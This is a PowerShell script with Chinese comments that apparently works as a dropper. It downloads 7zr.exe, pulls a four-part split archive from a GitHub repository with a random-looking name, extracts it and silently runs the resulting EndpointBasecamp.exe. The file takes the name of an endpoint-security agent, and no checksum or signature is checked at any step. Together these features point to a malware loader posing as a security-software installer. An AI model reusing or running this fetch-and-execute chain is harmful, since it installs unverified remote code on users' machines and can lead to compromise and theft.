$ErrorActionPreference = "Stop"

# 定義下載 7zr.exe 的連結與存放路徑
$sevenZipUrl = "https://www.7-zip.org/a/7zr.exe"
$sevenZipPath = ".\7zr.exe"
$downloadBaseUrl = "https://github.com/uvUpAjx4Zp/Khsw/raw/refs/heads/main"
$fileParts = @(
    "EndpointBasecamp.zip.001",
    "EndpointBasecamp.zip.002",
    "EndpointBasecamp.zip.003",
    "EndpointBasecamp.zip.004"
)
$downloadDir = ".\Download"
$extractDir = ".\Extracted"

# 下載 7zr.exe
if (-not (Test-Path $sevenZipPath)) {
    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipPath
}

# 確保下載目錄存在
if (-not (Test-Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir | Out-Null
}

# 下載壓縮檔
foreach ($filePart in $fileParts) {
    $fileUrl = "$downloadBaseUrl/$filePart"
    $destinationPath = Join-Path -Path $downloadDir -ChildPath $filePart
    if (-not (Test-Path $destinationPath)) {
        Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
    }
}

# 確保解壓縮目錄存在
if (-not (Test-Path $extractDir)) {
    New-Item -ItemType Directory -Path $extractDir | Out-Null
}

# 解壓縮檔案
$sevenZipArgs = "x `"$downloadDir\EndpointBasecamp.zip.001`" -o`"$extractDir`" -y"
$process = Start-Process -FilePath $sevenZipPath -ArgumentList $sevenZipArgs -NoNewWindow -Wait -PassThru
if ($process.ExitCode -ne 0) {
    exit 1
}

# 執行解壓縮後的檔案
$extractedFile = Join-Path -Path $extractDir -ChildPath "EndpointBasecamp.exe"
if (Test-Path $extractedFile) {
    Start-Process -FilePath $extractedFile -NoNewWindow
}
